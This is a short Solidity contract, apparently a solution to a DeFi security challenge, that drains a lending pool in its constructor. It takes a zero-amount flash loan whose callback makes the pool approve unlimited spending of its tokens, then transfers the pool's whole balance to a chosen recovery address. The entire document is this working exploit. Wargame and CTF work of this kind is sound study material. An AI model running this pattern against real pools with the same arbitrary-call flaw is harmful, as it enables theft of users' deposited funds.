// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract Recover {
    constructor(address pool, address token, address recovery) {
        IPool(pool).flashLoan(
            0, msg.sender, token, abi.encodeCall(IERC20(token).approve, (address(this), type(uint256).max))
        );

        IERC20(token).transferFrom(pool, recovery, IERC20(token).balanceOf(pool));
    }
}
